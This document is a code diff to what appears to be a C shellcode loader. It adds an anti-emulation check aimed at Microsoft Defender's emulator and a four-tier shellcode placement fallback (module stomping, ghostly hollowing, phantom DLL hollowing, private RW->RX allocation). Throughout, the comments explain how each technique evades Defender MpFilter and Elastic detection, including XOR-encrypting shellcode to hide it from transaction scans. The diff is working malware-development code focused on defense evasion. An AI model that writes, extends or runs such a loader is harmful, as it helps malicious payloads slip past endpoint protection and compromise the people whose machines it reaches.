@@ -41,6 +41,14 @@ int Main(VOID) {
 #ifndef DEBUG
     if (!AntiAnalysis())
         return 0;
+    // Anti-emulation: burn mpengine's wall-clock budget + detect emulator
+    // characteristics (RDRAND determinism, CPUID hypervisor brand). Defender
+    // emulates the first 10-100k instructions of a sample; if we don't bail
+    // here we still execute on real silicon, but the emulator may sign us
+    // based on emulated behaviour. Caller passes pApi NULL since WinApi
+    // hashing hasn't been initialized yet; AntiEmulation uses intrinsics only.
+    if (!AntiEmulation(NULL))
+        return 0;
 #endif
 
     // --- Initialize indirect syscall engine ---
@@ -155,17 +163,41 @@ int Main(VOID) {
     PVOID pExec   = NULL;
     BOOL  bPlaced = FALSE;
 
-    // Try phantom DLL hollowing first
-    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
+    // 4-tier placement fallback (P1-A). Order is "least Defender-attention
+    // first":
+    //
+    //   1. ModuleStomp     — pure in-memory write to a signed DLL's .text;
+    //                        no NTFS transaction, no FILE_OBJECT trickery.
+    //                        Defender MpFilter has no hook here.
+    //   2. GhostlyHollow   — FILE_FLAG_DELETE_ON_CLOSE + SEC_IMAGE. Avoids
+    //                        the transaction path that previously fired
+    //                        `transactionfile:...` alerts. Shellcode is
+    //                        written XOR-encrypted; decrypted in-memory.
+    //   3. PhantomDllHollow — NTFS-transaction-backed image section. Still
+    //                        the strongest disk-vs-memory mismatch, but
+    //                        Defender's MpFilter is transaction-aware
+    //                        since 2022, so we wrote the shellcode XOR'd
+    //                        (P2-E) — Defender sees garbage in the
+    //                        in-flight transaction view.
+    //   4. NtAllocate      — private RW->RX allocation. Loudest path
+    //                        (Elastic correlates against unbacked memory).
+    //                        Last resort.
+    bPlaced = ModuleStomp(&WinApis, pShellcode, dwShellcodeSize, &pExec);
     if (bPlaced) {
-        LOG("[+] Shellcode placed via phantom DLL hollowing");
+        LOG("[+] Shellcode placed via module stomping");
     }
 
-    // Fall back to module stomping
     if (!bPlaced) {
-        bPlaced = ModuleStomp(&WinApis, pShellcode, dwShellcodeSize, &pExec);
+        bPlaced = GhostlyHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
         if (bPlaced) {
-            LOG("[+] Shellcode placed via module stomping");
+            LOG("[+] Shellcode placed via ghostly hollowing");
+        }
+    }
+
+    if (!bPlaced) {
+        bPlaced = PhantomDllHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
+        if (bPlaced) {
+            LOG("[+] Shellcode placed via phantom DLL hollowing");
         }
     }
 
